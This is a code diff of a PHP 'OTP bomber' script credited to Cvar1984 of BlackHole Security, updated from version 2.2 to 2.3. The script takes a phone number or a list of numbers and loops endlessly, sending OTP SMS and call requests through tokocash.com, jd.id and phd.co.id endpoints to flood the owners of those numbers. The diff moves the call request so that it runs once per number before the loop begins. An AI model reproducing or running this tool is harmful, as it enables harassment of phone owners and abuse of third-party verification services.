@@ -25,7 +25,8 @@ if(strtolower(substr(PHP_OS, 0, 3)) == 'win') {
     system('clear');
 }
 declare(ticks = 1);
-pcntl_signal(SIGTERM, "signal_handler"); pcntl_signal(SIGINT, "signal_handler");
+pcntl_signal(SIGTERM, "signal_handler");
+pcntl_signal(SIGINT, "signal_handler");
 function signal_handler($signal) {
 	global $Y,$X;
 	switch($signal) {
@@ -59,14 +60,15 @@ echo $R."\n++++++++++++++++++++++++++++++++++++++";
 echo $B."\nAuthor  : Cvar1984                   ".$R.'+';
 echo $B."\nGithub  : https://github.com/Cvar1984".$R.'+';
 echo $B."\nTeam    : BlackHole Security         ".$R.'+';
-echo $B."\nVersion : 2.2                        ".$R.'+';
+echo $B."\nVersion : 2.3                        ".$R.'+';
 echo $B."\nDate    : 13-03-2018                 ".$R.'+';
 echo $R."\n++++++++++++++++++++++++++++++++++++++".$G.$X."\n\n";
 isset($argv[1]) OR die($RR."[!] Input No List [!]\n".$X);
 if(is_numeric($argv[1])) {
+	echo "Calling     -> ".$G.$argv[1].$X."\n";
+	post_data('https://www.tokocash.com/oauth/otp',"msisdn=".$argv[1]."&accept=call");
 	while(1) {
 		echo "Send OTP To -> ".$G.$argv[1].$X."\n";
-		post_data('https://www.tokocash.com/oauth/otp',"msisdn=".$argv[1]."&accept=call");
 		post_data("http://sc.jd.id/phone/sendPhoneSms","phone=".$argv[1]."&smsType=1");
 		post_data("https://www.phd.co.id/en/users/sendOTP","phone_number=".$argv[1]);
 	}
@@ -76,10 +78,13 @@ if(!file_exists($argv[1])) {
 }
 $argv[1]=explode("\n",file_get_contents($argv[1]));
 $argv[1]=str_replace(' ','',$argv[1]);
+foreach($argv[1] as $argv[2]):
+echo "Calling     -> ".$G.$argv[2].$X."\n";
+	post_data('https://www.tokocash.com/oauth/otp',"msisdn=".$argv[2]."&accept=call");
+endforeach;
 while(1) {
 foreach($argv[1] as $argv[2]):
-	echo "Send OTP To -> ".$G.$argv[2].$X."\n";
-	post_data('https://www.tokocash.com/oauth/otp',"msisdn=".$argv[2]."&accept=call");
+echo "Send OTP To -> ".$G.$argv[2].$X."\n";
 	post_data("http://sc.jd.id/phone/sendPhoneSms","phone=".$argv[2]."&smsType=1");
 	post_data("https://www.phd.co.id/en/users/sendOTP","phone_number=".$argv[2]);
 endforeach;
